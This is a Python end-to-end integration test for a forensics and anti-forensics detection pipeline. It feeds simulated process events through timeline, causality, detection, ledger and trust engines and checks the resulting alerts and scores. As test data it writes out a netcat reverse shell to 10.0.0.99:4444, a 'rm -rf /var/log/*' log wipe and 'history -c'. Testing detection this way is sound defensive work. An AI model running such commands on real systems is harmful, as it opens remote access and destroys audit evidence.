"""
End-to-End Investigation Workflow Integration Test.
"""

from chronos.system.collector import EvidenceCollector
from chronos.system.snapshot_recorder import SnapshotRecorder
from chronos.system.ledger_storage import EvidenceLedgerStorage
from chronos.research.timeline_engine import TimelineEngine
from chronos.research.causality_engine import CausalityEngine
from chronos.research.detection_engine import AntiForensicsDetectionEngine
from chronos.research.trust_engine import TrustAnalysisEngine
from chronos.shared.models import EventType, Event


def test_full_e2e_investigation_workflow():
    collector = EvidenceCollector(host_id="e2e_host")
    timeline_engine = TimelineEngine()
    causality_engine = CausalityEngine(host_id="e2e_host")
    detection_engine = AntiForensicsDetectionEngine()
    snapshot_recorder = SnapshotRecorder()
    ledger_storage = EvidenceLedgerStorage(chunk_size=3)
    trust_engine = TrustAnalysisEngine()

    detection_engine.register_alert_callback(snapshot_recorder.on_anti_forensic_alert)

    def bus(evt: Event):
        timeline_engine.add_event(evt)
        causality_engine.ingest_event(evt)
        detection_engine.analyze_event(evt)
        ledger_storage.add_event(evt)

    collector.register_listener(bus)

    # 1. Attack Execution
    collector.record_event(EventType.EXECVE.value, pid=501, ppid=1, comm="sshd", cmdline="sshd: root@pts/0")
    collector.record_event(EventType.EXECVE.value, pid=502, ppid=501, comm="bash", cmdline="/bin/bash")
    collector.record_event(EventType.CONNECT.value, pid=503, ppid=502, comm="nc", cmdline="nc -e /bin/bash 10.0.0.99 4444", target_ip="10.0.0.99", target_port=4444)

    # 2. Anti-Forensics
    collector.record_event(EventType.EXECVE.value, pid=504, ppid=502, comm="rm", cmdline="rm -rf /var/log/*", target_path="/var/log/syslog")
    collector.record_event(EventType.EXECVE.value, pid=505, ppid=502, comm="bash", cmdline="history -c")

    ledger_storage.commit_chunk()

    # 3. Validation
    assert len(collector.events) == 5
    assert len(timeline_engine.timeline_items) == 5
    assert len(detection_engine.alerts) == 2
    assert len(snapshot_recorder.snapshots) == 2
    
    valid, issues = ledger_storage.verify_integrity()
    assert valid is True

    ess = trust_engine.compute_ess(detection_engine.alerts)
    tcs = trust_engine.compute_tcs(ess, detection_engine.alerts, ledger_valid=valid)

    assert ess.ess_score < 100.0
    assert tcs.tcs_score < 100.0
    assert tcs.confidence_level in ["MEDIUM", "LOW"]
